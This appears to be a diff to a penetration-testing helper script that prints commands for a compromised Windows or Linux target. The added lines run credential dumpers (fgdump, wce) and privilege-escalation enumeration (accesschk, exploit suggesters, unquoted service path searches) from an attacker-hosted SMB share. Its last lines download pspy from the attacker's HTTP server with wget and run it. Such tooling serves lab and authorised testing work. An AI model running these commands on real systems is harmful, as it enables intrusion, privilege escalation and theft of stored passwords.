@@ -23,6 +23,17 @@ DIVIDER='\033[1;33m' #Prints yellow text
 
 NOCOLOR='\033[0m'
 
+http_port=80
+smb_share='share'
+
+exploits_linux='exploits_linux'
+exploits_windows='exploits_windows'
+exploits_linux_prevesc='exploits_linux_prevesc'
+exploits_windows_prevesc='exploits_windows_prevesc'
+payloads_linux='payloads_linux'
+payloads_windows='payloads_windows'
+scripts_linux='scripts_linux'
+scripts_windows='scripts_windows'
 
 # Find the IP of the tun0 interface, change tun0 to another interface if desired
 tun0="$(ip addr show | grep tun0 |grep -o 'inet [0-9]*\.[0-9]*\.[0-9]*\.[0-9]*' | grep -o '[0-9]*\.[0-9]*\.[0-9]*\.[0-9]*')"
@@ -76,3 +87,75 @@ echo -e "5) ${COPYME}export SHELL=bash${NOCOLOR}"
 echo -e "6) ${COPYME}export TERM=xterm-256color${NOCOLOR}"
 echo -e "7) ${COPYME}stty rows 38 columns 116${NOCOLOR}"
 echo ""
+
+# SMB
+echo "python.exe //$tun0/$smb_share/$scripts_windows/windows-exploit-suggester.py"
+
+echo "//$tun0/$smb_share/$scripts_windows/Watson_Net35.exe"
+echo "//$tun0/$smb_share/$scripts_windows/Watson_Net45.exe"
+
+echo "//$tun0/$smb_share/$scripts_windows/bin/fgdump/fgdump.exe" # pwdump cachedump pstgdump
+echo "//$tun0/$smb_share/$scripts_windows/wce.exe"
+echo "//$tun0/$smb_share/$scripts_windows/tcpdump.exe"
+
+echo "Services with write access"
+echo "//$tun0/$smb_share/$scripts_windows/accesschk.exe -uwcqv * /accepteula"
+echo "//$tun0/$smb_share/$scripts_windows/accesschk-2003-xp.exe -uwcqv * /accepteula"
+echo "//$tun0/$smb_share/$scripts_windows/accesschk-2008-vista.exe -uwcqv * /accepteula"
+
+echo "Services with write access to user testuser"
+echo "//$tun0/$smb_share/$scripts_windows/accesschk.exe -uwcqv \"testuser\" * /accepteula"
+echo "//$tun0/$smb_share/$scripts_windows/accesschk-2003-xp.exe -uwcqv \"testuser\" * /accepteula"
+echo "//$tun0/$smb_share/$scripts_windows/accesschk-2008-vista.exe -uwcqv \"testuser\" * /accepteula"
+
+echo "Services with write access for Authenticated Users"
+echo "//$tun0/$smb_share/$scripts_windows/accesschk.exe -uwcqv \"Authenticated Users\" * /accepteula"
+echo "//$tun0/$smb_share/$scripts_windows/accesschk-2003-xp.exe -uwcqv \"Authenticated Users\" * /accepteula"
+echo "//$tun0/$smb_share/$scripts_windows/accesschk-2008-vista.exe -uwcqv \"Authenticated Users\" * /accepteula"
+
+echo "Services with write access for Everyone"
+echo "//$tun0/$smb_share/$scripts_windows/accesschk.exe -uwcqv \"Everyone\" * /accepteula"
+echo "//$tun0/$smb_share/$scripts_windows/accesschk-2003-xp.exe -uwcqv \"Everyone\" * /accepteula"
+echo "//$tun0/$smb_share/$scripts_windows/accesschk-2008-vista.exe -uwcqv \"Everyone\" * /accepteula"
+
+echo "Services details for all services"
+echo "//$tun0/$smb_share/$scripts_windows/accesschk.exe -ucqv * /accepteula"
+echo "//$tun0/$smb_share/$scripts_windows/accesschk-2003-xp.exe -ucqv * /accepteula"
+echo "//$tun0/$smb_share/$scripts_windows/accesschk-2008-vista.exe -ucqv * /accepteula"
+
+echo "Services details for Spooler"
+echo "//$tun0/$smb_share/$scripts_windows/accesschk.exe -ucqv Spooler /accepteula"
+echo "//$tun0/$smb_share/$scripts_windows/accesschk-2003-xp.exe -ucqv Spooler /accepteula"
+echo "//$tun0/$smb_share/$scripts_windows/accesschk-2008-vista.exe -ucqv Spooler /accepteula"
+
+echo "Weak file permissions"
+echo "//$tun0/$smb_share/$scripts_windows/accesschk.exe -dqv \"C:\\\" /accepteula"
+echo "//$tun0/$smb_share/$scripts_windows/accesschk-2003-xp.exe -dqv \"C:\\\" /accepteula"
+echo "//$tun0/$smb_share/$scripts_windows/accesschk-2008-vista.exe -dqv \"C:\\\" /accepteula"
+
+echo "Write access to file for Users"
+echo "//$tun0/$smb_share/$scripts_windows/accesschk.exe -uwdqs \"Users\" \"C:\\\" /accepteula"
+echo "//$tun0/$smb_share/$scripts_windows/accesschk-2003-xp.exe -uwdqs \"Users\" \"C:\\\" /accepteula"
+echo "//$tun0/$smb_share/$scripts_windows/accesschk-2008-vista.exe -uwdqs \"Users\" \"C:\\\" /accepteula"
+
+echo "Write access to file for Authenticated Users"
+echo "//$tun0/$smb_share/$scripts_windows/accesschk.exe -uwdqs \"Authenticated Users\" \"C:\\\" /accepteula"
+echo "//$tun0/$smb_share/$scripts_windows/accesschk-2003-xp.exe -uwdqs \"Authenticated Users\" \"C:\\\" /accepteula"
+echo "//$tun0/$smb_share/$scripts_windows/accesschk-2008-vista.exe -uwdqs \"Authenticated Users\" \"C:\\\" /accepteula"
+
+echo "Write access to file for Everyone"
+echo "//$tun0/$smb_share/$scripts_windows/accesschk.exe -uwdqs \"Everyone\" \"C:\\\" /accepteula"
+echo "//$tun0/$smb_share/$scripts_windows/accesschk-2003-xp.exe -uwdqs \"Everyone\" \"C:\\\" /accepteula"
+echo "//$tun0/$smb_share/$scripts_windows/accesschk-2008-vista.exe -uwdqs \"Everyone\" \"C:\\\" /accepteula"
+
+# Find servive unquote paths
+# wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """
+# gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
+
+#./windows-exploit-suggester.py --database 2014-06-06-mssb.xlsx --systeminfo win7sp1-systeminfo.txt
+#windows-privesc-check2.exe --audit -a -o wpc-report
+#windows-privesc-check2.exe --dump -a > dump.txt
+
+# HTTP
+echo "wget http://$tun0/$scripts_linux/pspy32; pspy32"
+echo "wget http://$tun0/$scripts_linux/pspy64; pspy64"
